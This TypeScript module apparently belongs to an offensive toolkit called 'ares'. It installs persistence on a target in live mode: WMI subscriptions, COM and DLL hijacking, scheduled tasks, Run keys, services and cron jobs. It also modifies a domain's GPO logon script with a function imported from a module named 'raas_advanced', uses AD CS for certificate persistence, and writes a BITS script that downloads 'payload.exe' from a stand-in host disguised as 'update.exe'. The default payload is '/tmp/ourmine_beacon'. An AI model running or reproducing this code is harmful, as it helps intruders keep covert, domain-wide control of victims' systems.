/**
 * @module ares/persistence_advanced
 * Advanced persistence — PersistenceEngine live install + ADCS/GPO integration.
 */
import { PersistenceEngine } from "../persistence.ts"
import { modifyGpoLogonScript } from "../raas_advanced.ts"
import { auditADCS } from "../adcs_audit.ts"
import { liveRequired, writeArtifact } from "./_base.ts"
import { runIfTool, step, type ExecStep } from "./_integrations.ts"

export interface PersistenceAdvancedResult {
  mechanisms: string[]
  steps: ExecStep[]
  installed: number
  summary: string
}

const TARGET_MECHANISMS = [
  "WMI Event Subscription",
  "COM Object Hijacking",
  "Scheduled Task",
  "Registry Run Key",
  "Service Creation",
  "DLL Search Order Hijacking",
]

export async function installAdvancedPersistence(opts: {
  live?: boolean
  os?: "windows" | "linux"
  payload?: string
  domain?: string
}): Promise<PersistenceAdvancedResult> {
  liveRequired("ares_persistence_advanced", opts)
  const os = opts.os ?? (process.platform === "win32" ? "windows" : "linux")
  const payload = opts.payload ?? "/tmp/ourmine_beacon"
  const engine = new PersistenceEngine()
  const mechanisms: string[] = []
  const steps: ExecStep[] = []
  let installed = 0

  for (const name of TARGET_MECHANISMS) {
    const result = await engine.installPersistence(name, { live: true, targetOs: os, payloadPath: payload })
    mechanisms.push(name)
    const ok = !!(result as { installed?: boolean }).installed
    if (ok) installed++
    steps.push(step(name, ok || !(result as { error?: string }).error, JSON.stringify(result).slice(0, 400)))
    writeArtifact("persistence", `${name.replace(/\s+/g, "_").toLowerCase()}.json`, JSON.stringify(result, null, 2))
  }

  if (os === "linux") {
    steps.push(await runIfTool("systemctl", "systemd_audit", "systemctl list-unit-files --type=service 2>&1 | head -15"))
    const cronResult = await engine.installPersistence("Cron Job", { live: true, targetOs: "linux", payloadPath: payload })
    mechanisms.push("Cron Job")
    if ((cronResult as { installed?: boolean }).installed) installed++
    steps.push(step("cron_job", !!(cronResult as { installed?: boolean }).installed, JSON.stringify(cronResult).slice(0, 300)))
  }

  if (opts.domain) {
    const gpo = modifyGpoLogonScript(opts.domain, payload, { forceLive: true })
    mechanisms.push("gpo_logon_script")
    steps.push(step("gpo_logon", gpo.smbUploaded || gpo.ldapModified, gpo.output))
    if (gpo.smbUploaded || gpo.ldapModified) installed++
  }

  const adcs = auditADCS({ domain: opts.domain ?? "CORP.LOCAL" }, { live: true })
  writeArtifact("persistence", "adcs_cert_persist.json", JSON.stringify(adcs, null, 2))
  mechanisms.push("adcscleanup", "esc11")
  steps.push(step("adcs_cert_audit", true, `${adcs.findings.length} AD CS finding(s)`))

  writeArtifact("persistence", "appdomain_inject.cs", `// .NET AppDomain Manager injection scaffold\n`)
  writeArtifact("persistence", "bits_job.ps1", `Start-BitsTransfer -Source "https://example.invalid/payload.exe" -Destination "$env:TEMP\\update.exe"\n`)
  mechanisms.push("appdomain_manager_injection", "bits_job_persistence")

  return {
    mechanisms,
    steps,
    installed,
    summary: `Advanced persistence: ${installed}/${mechanisms.length} mechanism(s) installed on ${os}`,
  }
}

export default { installAdvancedPersistence }
